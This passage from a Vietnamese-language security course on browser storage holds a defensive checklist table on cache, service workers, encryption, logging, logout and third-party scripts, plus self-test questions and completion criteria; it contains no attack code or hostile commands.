| Cache | Có cache response riêng tư hoặc cache key dùng chung không? | HTTP cache và Cache Storage có policy riêng tư rõ ràng. |
| Service worker | Worker có thể trả dữ liệu sau logout không? | Kiểm tra session và dọn cache đúng lifecycle. |
| Encryption | Khóa có nằm cùng nơi với ciphertext hoặc khả dụng cho XSS không? | Threat model khóa rõ; không coi client encryption là XSS defense. |
| Logging | Token/PII có đi vào console, telemetry, URL hoặc bug report không? | Mask và loại bỏ dữ liệu nhạy cảm khỏi log. |
| Multi-tab | Logout/đổi tài khoản có đồng bộ giữa tab không? | Tab reset UI; server là nguồn session authority. |
| Retention | Có TTL, cleanup và quy trình xóa tài khoản không? | Dữ liệu hết mục đích được xóa ở client và server. |
| Third-party scripts | Script bên thứ ba có cần chạy trong origin đặc quyền không? | Giảm dependency, kiểm soát CSP/SRI và quyền truy cập. |
| Device/profile | Có giả định browser profile luôn riêng tư không? | Có timeout/logout và hướng dẫn cho thiết bị dùng chung. |

## 15. Câu hỏi tự kiểm tra

1. Vì sao dữ liệu trong localStorage không trở nên bí mật chỉ vì được lưu trên thiết bị người dùng?
2. XSS trong một origin có thể đọc những loại browser storage nào?
3. Same-Origin Policy bảo vệ dữ liệu giữa các origin nhưng không cô lập các module cùng origin như thế nào?
4. sessionStorage khác localStorage về vòng đời ra sao và vì sao nó vẫn không chống được XSS?
5. IndexedDB và Cache Storage có thể làm lộ dữ liệu sau logout trong tình huống nào?
6. HttpOnly cookie ngăn JavaScript đọc cookie nhưng vì sao XSS vẫn có thể thực hiện request cùng origin?
7. Cache-Control no-store khác việc ứng dụng chủ động ghi response vào Cache Storage như thế nào?
8. Vì sao mã hóa bằng khóa được lưu cùng ciphertext không bảo vệ tốt trước người lấy được storage?
9. Quy trình logout cần phối hợp những thao tác nào ở backend, Web Storage, IndexedDB, Cache Storage và service worker?
10. Làm thế nào audit storage bằng DevTools mà không làm lộ thêm token/PII trong log hoặc ảnh chụp?

**Tiêu chí hoàn thành:** người học có thể xây dựng threat model cho browser storage, nhận diện đường rò rỉ qua XSS, cache, cookie, service worker và vận hành thiết bị; lựa chọn nơi lưu theo độ nhạy cảm; giải thích giới hạn mã hóa phía client; đồng thời triển khai data minimization, session revocation, cleanup và kiểm chứng logout/đổi tài khoản bằng DevTools.
